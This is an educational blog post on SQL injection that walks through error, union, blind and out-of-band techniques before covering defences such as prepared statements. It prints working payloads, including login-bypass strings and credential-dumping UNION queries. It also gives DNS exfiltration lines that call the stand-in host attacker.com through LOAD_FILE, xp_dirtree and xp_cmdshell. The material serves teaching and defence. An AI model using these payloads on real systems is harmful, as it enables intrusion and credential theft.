SQL Injection — How It Works, How to Find It, and How to Stop It

SQL Injection has been breaking into databases for over two decades and still tops the OWASP charts today. This post covers the SQL mechanics that make it possible, every major attack technique — In-Band, Blind, and Out-of-Band — and the defences that actually prevent it.

Background

SQL Foundations You Need to Know First

SQL Injection payloads are not random noise — they are precisely constructed SQL. To understand why they work, you first need to understand the handful of SQL features attackers reach for most often. None of these are obscure; they are standard query tools that turn dangerous the moment user input is handled without care.

Comments

SQL comments tell the database to ignore everything that follows on the line. MySQL accepts two forms: a double dash followed by a space (-- ) and a hash (#). Anything after either symbol is invisible to the query parser. In an injection context, this is how you surgically cut off the legitimate remainder of a query after your payload — turning a two-condition check into a one-condition check, or eliminating a password field entirely.

UNION

The UNION operator stitches two SELECT statements together into one result set. The rule is strict: both queries must return the same number of columns. Attackers exploit this to append their own SELECT onto a legitimate query, pulling rows from tables they were never supposed to touch. The number of columns in the original query is the first thing an attacker figures out during a UNION-based attack.

LIKE and Wildcards

The LIKE operator does pattern matching against strings. The % wildcard matches any sequence of characters; _ matches exactly one. Together they let you ask questions like "does this value start with the letter a?" — which is the engine behind every blind injection attack that extracts data one character at a time.

LIMIT

The LIMIT clause caps how many rows a query returns. The two-argument form, LIMIT offset, count, lets you skip rows and page through results. Attackers use it to control exactly which row surfaces from an injected query, or to prevent a flood of results from breaking the page layout.

String Functions

Two functions show up constantly in injection payloads. group_concat() collapses multiple rows into a single comma-separated string, letting you dump an entire column in one shot rather than row by row. CONCAT() joins individual values together — the classic CONCAT(username, ':', password) produces clean credentials ready to copy.

The information_schema Database

Every MySQL, MariaDB, and PostgreSQL server ships with a built-in database called information_schema. It is the database's own map of itself: every database name, every table name, every column name. When exploiting Union-Based injection, information_schema.tables and information_schema.columns are how you go from "I can inject something" to "I have a complete blueprint of the data model."

Note on database engines: This post uses MySQL syntax throughout. Other engines — MSSQL, PostgreSQL, SQLite, Oracle — have their own comment characters, system tables, and function names. The concepts transfer directly; only the exact payloads differ.

The Vulnerability

What Is SQL Injection?

SQL Injection occurs when a web application builds a database query by concatenating user-supplied input directly into a SQL string — and then executes it. The database has no way to distinguish the developer's intended syntax from characters the attacker added. It simply runs the whole thing.

Listed under OWASP A05:2025 — Injection, SQLi is one of the oldest and most consistently exploited vulnerability classes in web security. Despite being well-understood and trivially preventable, it keeps appearing in modern applications and sits behind some of the most damaging data breaches ever recorded.

A Concrete Example

Consider a blog where each article is fetched by URL parameter: https://example.com/article?id=1. On the server side, the code might look like this:

Vulnerable PHP
$query = "SELECT * FROM articles WHERE id = " . $_GET['id'] . " AND public = 1;";

Normally this fetches the article with ID 1. But if a visitor changes the URL to ?id=1 OR 1=1--, the query becomes:

Injected query
SELECT * FROM articles WHERE id = 1 OR 1=1-- AND public = 1;

OR 1=1 makes the WHERE clause permanently true. The -- comments out the AND public = 1 check. The database now returns every article — including private drafts, admin content, or anything else in that table.

Finding the Injection Point

Any input that flows into a SQL query is a potential target: URL parameters, form fields, search boxes, login forms, cookies, and HTTP headers like User-Agent or Referer. The simplest probe is a single quote ' — if the application throws a database error in response, the input is being concatenated raw into the query with no sanitisation.

When errors are suppressed, you rely on subtler signals: does the page respond differently to OR 1=1 versus OR 1=2? Does injecting SLEEP(5) add a measurable delay? These behavioural differences are the foundation of Blind injection, covered in detail below.

Classification

Types of SQL Injection

All SQL injection attacks share the same root cause, but they are categorised by how the attacker receives feedback from the database. That feedback channel determines which technique applies.

In-Band
Error-Based
The database surfaces error messages that reveal structure — table names, column names, query syntax. The easiest type to exploit, and the first sign to look for.
In-Band
Union-Based
A second SELECT is appended to the original query via UNION. The stolen data appears directly in the page response, making extraction fast and reliable.
Blind
Boolean-Based
The application shows no data, but its response changes subtly between a true and a false condition. You ask yes/no questions and decode the answer from that binary signal.
Blind
Time-Based
The page looks identical regardless of what you inject. The only signal is response time — a SLEEP() delay tells you a condition was true; an instant reply means false.
Out-of-Band
DNS / HTTP Exfiltration
The database server is made to contact an attacker-controlled server, encoding stolen data in the outbound request. The last resort when all other channels are closed.
Exploitation · In-Band

In-Band SQL Injection

In-Band is the most common category in the wild and the most straightforward to exploit — the same web request you use to inject is also how you receive the stolen data. There is no timing analysis or out-of-band infrastructure required; you just read the page.

Error-Based Injection

When a misconfigured application prints raw database errors, those messages hand you a roadmap. Injecting a single quote into a vulnerable parameter might return something like:

You have an error in your SQL syntax; check the manual that corresponds
to your MySQL server version for the right syntax to use near ''1'' at line 1

That one message confirms the database engine (MySQL), tells you the input is wrapped in single quotes, and reveals that error handling is non-existent. From here you can craft payloads that deliberately trigger informative errors, leaking table names and column names without running a full extraction.

Union-Based Injection

This is the workhorse technique for In-Band extraction. The goal is to append a second SELECT to the original query and have its results appear in the page alongside — or instead of — the legitimate output. The methodology is always the same four steps.

Step 1 — Find the column count. UNION requires both queries to return the same number of columns. Increment the count until the error disappears:

1 UNION SELECT 1          -- error
1 UNION SELECT 1,2        -- error
1 UNION SELECT 1,2,3      -- success: original query has 3 columns

Step 2 — Find which columns are rendered. Set the original query to return zero results so only the UNION output appears, then see which column positions show up on the page:

0 UNION SELECT 1,2,3

If the number 3 appears in the content area of the page, column position 3 is your extraction slot.

Step 3 — Extract the database name. Replace the visible position with the database() function:

0 UNION SELECT 1,2,database()

Step 4 — Map the schema and pull data. Query information_schema.tables for table names, information_schema.columns for column names, then target the tables that matter:

-- Get all table names in the current database
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables
  WHERE table_schema = database();

-- Get column names from a specific table
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns
  WHERE table_name = 'users';

-- Extract credentials
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '\n') FROM users;

Authentication Bypass

A special case of In-Band injection worth its own heading. Most login forms build a query along these lines:

SELECT * FROM users WHERE username='INPUT' AND password='INPUT' LIMIT 1;

If the application logs you in whenever that query returns any row, you can bypass it entirely. Inject ' OR 1=1-- as the username and anything as the password:

SELECT * FROM users WHERE username='' OR 1=1-- AND password='anything' LIMIT 1;

OR 1=1 is always true, so the query returns every user. The -- comments out the password check. The application logs you in as the first row returned — typically an admin account. To target a specific user, inject their name directly: admin'-- produces a query that matches only the admin row and skips the password check entirely.

PayloadWhat It Does
' OR 1=1-- Bypasses login, returns the first user in the table (often admin).
admin'-- Logs in as the specific user "admin" without a password.
' OR 1=1# Same bypass using MySQL's alternative comment character.
" OR 1=1-- For queries that wrap input in double quotes instead of single.
Exploitation · Blind

Blind SQL Injection

Blind injection is for when the application gives nothing away — no data in the response, no error messages. The vulnerability is still there; you just cannot read the output directly. Instead, you infer data from indirect signals, patiently, one character at a time.

Boolean-Based Blind

This technique exploits any application behaviour that differs between a true condition and a false one. It might be different page content, a JSON field that flips between true and false, or even a difference in HTTP status code. Whatever the signal, you use it to ask the database yes/no questions.

Imagine a username-availability endpoint: /checkuser?username=admin returns {"taken":true}, and ?username=nobody returns {"taken":false}. If this endpoint is injectable, you can ask arbitrary questions and read the answer from that boolean:

  1. 1Confirm injection. Inject a condition that is always true — admin' UNION SELECT 1,2,3 WHERE database() LIKE '%';-- — and verify the response stays true. Then flip to a condition that is always false and confirm the response changes.
  2. 2Enumerate the database name, character by character. Test each starting letter: admin' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--. False? Move to b%, c%, and so on. When the response flips true, lock in that letter and move to the second position.
  3. 3Map tables and columns. Same character-by-character logic, but now querying information_schema.tables and information_schema.columns to build a picture of the schema.
  4. 4Extract values. Repeat for actual data — usernames, passwords, anything in the database. Each character requires multiple requests, but the process is reliable and methodical.

Time-Based Blind

When the application gives no visible difference between true and false responses at all — same content, same status code, same everything — time becomes your only channel. MySQL's SLEEP(n) function pauses query execution for n seconds, and it only runs when the condition wrapping it is true:

admin' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--

If the response takes around 5 seconds, the database name starts with "s". If it comes back immediately, it doesn't. You then fix "s" and test the second character, working through the name letter by letter — the same logic as Boolean-Based, except the clock replaces the page content as your feedback mechanism.

Practical caution: Network jitter can create false positives. Use sleep values of 5–10 seconds rather than 1–2, and test ambiguous characters twice. On MSSQL, the equivalent function is WAITFOR DELAY '0:0:5'. On production engagements, consider using SQLmap to automate the enumeration — but always do at least one manual pass first so you understand what the tool is actually doing.

Exploitation · Out-of-Band

Out-of-Band SQL Injection

Out-of-Band (OOB) injection takes a completely different approach to the feedback problem. Rather than reading anything from the web response, you force the database server itself to reach out to a server you control — carrying the stolen data as part of that outbound request. Two channels, separated: you inject through HTTP, and the data arrives via DNS or a secondary HTTP connection.

OOB only makes sense as a last resort. In-Band is unavailable, Boolean-Based gives no signal, and Time-Based is blocked or too unreliable. But the database server still has outbound network access — that is the one prerequisite. If a firewall blocks all egress from the database server, OOB is dead before it starts.

DNS Exfiltration with MySQL

The most common MySQL approach uses LOAD_FILE() with a UNC path to trigger a DNS lookup. The data you want is embedded as a subdomain:

SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));

What happens step by step: SELECT database() retrieves the database name — say, webapp_db. CONCAT() builds the string \\webapp_db.attacker.com\share. LOAD_FILE() attempts to read that network path, which on a Windows MySQL server triggers a DNS resolution for webapp_db.attacker.com. Your listening DNS server logs the lookup — and the database name is right there in the subdomain.

MSSQL Techniques

Microsoft SQL Server has dedicated stored procedures that make OOB more direct. xp_dirtree forces a DNS lookup by attempting to list a remote directory — no special file permissions required:

EXEC master..xp_dirtree '\\attacker.com\share';

If xp_cmdshell is enabled (it is off by default in modern MSSQL, but worth checking), it lets you run OS commands directly and ship data out with standard tools:

EXEC xp_cmdshell 'nslookup exfil-data.attacker.com';

Catching the Data

You need a listener on the receiving end. Burp Collaborator provides a unique subdomain and logs every DNS and HTTP callback — inject the Collaborator domain into your payload, then check the Collaborator tab for hits. Interactsh from ProjectDiscovery does the same thing and is free to self-host. For full control, a lightweight Python DNS server using dnslib works well.

Limitations to Know

  • The database server must be able to make outbound connections — many hardened production setups block this entirely.
  • Payloads are engine-specific. MySQL, MSSQL, and PostgreSQL each need different syntax.
  • DNS subdomain labels are capped at 63 characters, which limits how much data you can exfiltrate per lookup.
  • OOB is generally slower and less reliable than pulling data through the web response directly.
Defence Layer

How to Actually Stop SQL Injection

The frustrating truth about SQL Injection is that it has been preventable since the day it was discovered. The fixes are mature, well-documented, and available in every mainstream language and framework. What follows are the defences that genuinely matter, ordered by how much they actually help.

Prepared Statements — The Only Real Fix

Prepared statements, also called parameterised queries, eliminate SQL Injection by construction. The developer writes the query structure with placeholders and sends it to the database separately from the user-supplied values. The database engine compiles the query first, then binds the user input as data. At no point does the input touch the query structure — so even a payload like ' OR 1=1-- is treated as a literal string, not SQL syntax.

Vulnerable — string concatenation
// PHP (dangerous)
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";
$result = mysqli_query($conn, $query);
Fixed — prepared statement (PHP PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);
$result = $stmt->fetchAll();
Fixed — prepared statement (Python)
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))

Every modern language and framework supports this pattern. There is no scenario where concatenating user input into a SQL string is the correct approach.

Input Validation

Allowlisting — defining exactly what is acceptable and rejecting everything else — adds a layer of defence before the query is even built. If a parameter is meant to be an article ID, it should only ever contain digits. If it contains a quote, a dash, or any letter, something is wrong:

PHP — allowlist validation
if (!ctype_digit($_GET['id'])) {
    http_response_code(400);
    die("Invalid input");
}

Allowlisting is not a substitute for prepared statements — it is a complementary layer. An attacker who slips past validation still hits a parameterised query. An attacker who exploits a gap in validation still has nowhere to inject.

Escaping User Input

Escaping neutralises special characters by adding a backslash before them, so they are interpreted as literal strings rather than SQL syntax. Most database libraries provide a function for this — mysqli_real_escape_string() in PHP's MySQLi, for example. It is better than nothing, but it is a fragile layer: escaping functions can be bypassed under specific character encodings, and a developer who forgets to call it on even one parameter opens a hole. Use prepared statements as the primary defence; escaping as a secondary one if legacy code makes prepared statements impractical to retrofit everywhere at once.

Principle of Least Privilege

The database account your web application connects with should only have the permissions it needs. A customer-facing application that reads product listings does not need DROP TABLE. A blog that reads and writes posts does not need access to the users table. If an attacker exploits an injection flaw in an account with limited permissions, the blast radius is contained. If the account has full admin rights, the entire database — and potentially the entire server — is compromised.

Web Application Firewalls

A WAF sits in front of your application and inspects incoming requests for known attack patterns. It can block or flag requests containing SQL keywords, comment sequences, or payload structures commonly seen in injection attempts. WAFs are useful as a detection and delay layer, but they are not a reliable primary defence — attackers routinely bypass WAF rules with encoding tricks, unusual whitespace, or payloads crafted to avoid signature matches. Fix the code first; the WAF buys time, not safety.

  • Always use parameterised queries or prepared statements — no exceptions, no legacy excuses.
  • Allowlist inputs wherever the expected format is predictable (numeric IDs, dates, enum values).
  • Limit database account permissions to only what the application actually needs.
  • Suppress detailed error messages in production — never expose raw SQL errors to end users.
  • Run periodic vulnerability scans and penetration tests; SQLi is easy to miss in code review.
  • Keep database engines and drivers patched — occasionally the vulnerability is in the engine itself.

The bottom line: Prepared statements alone would eliminate the vast majority of SQL Injection vulnerabilities in production today. Every other layer — allowlisting, least privilege, WAFs, error suppression — matters, but none of it compensates for skipping parameterisation. Write the query right the first time; everything else is damage control.
